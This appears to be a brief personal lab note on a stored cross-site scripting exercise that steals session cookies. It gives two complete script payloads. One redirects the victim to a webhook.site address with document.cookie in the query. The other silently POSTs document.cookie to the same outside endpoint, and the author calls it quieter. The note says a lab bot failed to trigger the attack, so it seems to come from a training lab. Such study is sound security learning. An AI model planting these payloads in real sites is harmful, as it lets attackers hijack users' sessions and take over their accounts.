using https://webhook.site/

i was able to setup my own DNS server to get HTTP requests coming to the server

using the pyalod of:
<script type="text/javascript">
  document.location = "https://webhook.site/f76210d2-3899-4b05-af2d-14de664ff6b1?c=" + document.cookie;
</script>

I was able to send my own cookie to the website when viewing the comment using the stored XSS attack

however, for some reason the bot has not picked up this XSS attack therefore cannot complete the lab...




alternative to using this payload is using:
<script>
fetch('https://webhook.site/f76210d2-3899-4b05-af2d-14de664ff6b1', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

This sends a post request to the domain and picks up the session cookie of the user

this is also a lot more silent than the one above
